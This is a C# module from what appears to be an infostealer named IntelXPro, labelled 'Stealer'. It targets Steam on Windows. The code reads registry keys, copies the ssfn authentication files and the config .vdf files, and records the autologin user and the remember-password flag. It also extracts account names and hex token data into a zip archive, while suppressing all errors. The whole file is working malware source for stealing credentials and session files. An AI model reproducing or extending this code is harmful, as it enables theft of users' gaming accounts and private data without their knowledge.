using IntelXPro.src.IntelXPro.Dependencies.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Games
{
    internal class Steam : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
            if (registryKey == null || registryKey.GetValue("SteamPath") == null)
            {
                return;
            }
            string text = registryKey.GetValue("SteamPath").ToString();
            if (!Directory.Exists(text))
            {
                return;
            }
            string path = "Steam";
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Steam";
            try
            {
                RegistryKey registryKey2 = registryKey.OpenSubKey("Apps");
                if (registryKey2 != null)
                {
                    List<string> list = new List<string>();
                    string[] subKeyNames = registryKey2.GetSubKeyNames();
                    foreach (string text2 in subKeyNames)
                    {
                        using (RegistryKey registryKey3 = registryKey.OpenSubKey("Apps\\" + text2))
                        {
                            if (registryKey3 != null)
                            {
                                string text3 = (registryKey3.GetValue("Name") as string) ?? "Unknown";
                                string text4 = (((int?)registryKey3.GetValue("Installed") == 1) ? "Yes" : "No");
                                string text5 = (((int?)registryKey3.GetValue("Running") == 1) ? "Yes" : "No");
                                string text6 = (((int?)registryKey3.GetValue("Updating") == 1) ? "Yes" : "No");
                                list.Add("Application: " + text3 + "\n\tGameID: " + text2 + "\n\tInstalled: " + text4 + "\n\tRunning: " + text5 + "\n\tUpdating: " + text6);
                            }
                        }
                    }
                    if (list.Count > 0)
                    {
                        string text7 = Path.Combine(path, "Apps.txt");
                        zip.AddTextFile(text7, string.Join("\n\n", list));
                        counterApplications.Files.Add("Software\\Valve\\Steam\\Apps => " + text7);
                    }
                }
            }
            catch
            {
            }
            try
            {
                string[] subKeyNames = Directory.GetFiles(text);
                foreach (string text8 in subKeyNames)
                {
                    if (text8.Contains("ssfn"))
                    {
                        byte[] content = File.ReadAllBytes(text8);
                        string text9 = Path.Combine(path, "ssfn", Path.GetFileName(text8));
                        zip.AddFile(text9, content);
                        counterApplications.Files.Add(text8 + " => " + text9);
                    }
                }
            }
            catch
            {
            }
            try
            {
                string path2 = Path.Combine(text, "config");
                if (Directory.Exists(path2))
                {
                    string[] subKeyNames = Directory.GetFiles(path2, "*.vdf");
                    foreach (string text10 in subKeyNames)
                    {
                        string text11 = Path.Combine(path, "configs", Path.GetFileName(text10));
                        zip.AddFile(text11, File.ReadAllBytes(text10));
                        counterApplications.Files.Add(text10 + " => " + text11);
                    }
                }
            }
            catch
            {
            }
            try
            {
                string text12 = registryKey.GetValue("AutoLoginUser")?.ToString() ?? "Unknown";
                string text13 = (((int?)registryKey.GetValue("RememberPassword") == 1) ? "Yes" : "No");
                string text14 = "Autologin User: " + text12 + "\nRemember password: " + text13;
                string text15 = Path.Combine(path, "SteamInfo.txt");
                zip.AddTextFile(text15, text14);
                counterApplications.Files.Add("Software\\Valve\\Steam => " + text15);
            }
            catch
            {
            }
            try
            {
                string[] source = new string[2]
                {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Steam", "local.vdf"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Steam", "local.vdf")
                };
                string[] source2 = new string[2]
                {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam", "config", "loginusers.vdf"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Steam", "config", "loginusers.vdf")
                };
                string text16 = source.FirstOrDefault(File.Exists);
                string text17 = source2.FirstOrDefault(File.Exists);
                if (text16 == null || text17 == null)
                {
                    return;
                }
                string pattern = "\"AccountName\"\\s*\"([^\"]+)\"";
                string pattern2 = "([a-fA-F0-9]{500,2000})";
                MatchCollection matchCollection = Regex.Matches(File.ReadAllText(text17), pattern);
                MatchCollection matchCollection2 = Regex.Matches(File.ReadAllText(text16), pattern2);
                if (matchCollection.Count == 0 || matchCollection2.Count == 0)
                {
                    return;
                }
                List<string> list2 = new List<string>();
                foreach (Match item in matchCollection)
                {
                    byte[] bytes = Encoding.UTF8.GetBytes(item.Groups[1].Value);
                    foreach (Match tokenMatch in matchCollection2)
                    {
                        byte[] encryptedData = (from x in Enumerable.Range(0, tokenMatch.Value.Length / 2)
                                                select Convert.ToByte(tokenMatch.Value.Substring(x * 2, 2), 16)).ToArray();
                        try
                        {
                            list2.Add("Token decryption not available in current framework");
                        }
                        catch
                        {
                            continue;
                        }
                        break;
                    }
                }
                if (list2.Count > 0)
                {
                    string text18 = Path.Combine(path, "Token.txt");
                    zip.AddTextFile(text18, string.Join("\n", list2));
                    counterApplications.Files.Add(text16 + " => " + text18);
                    counterApplications.Files.Add(text17 + " => " + text18);
                }
            }
            catch
            {
            }
            if (counterApplications.Files.Count > 0)
            {
                counterApplications.Files.Add("Steam\\");
                counter.Games.Add(counterApplications);
            }
        }
    }
}
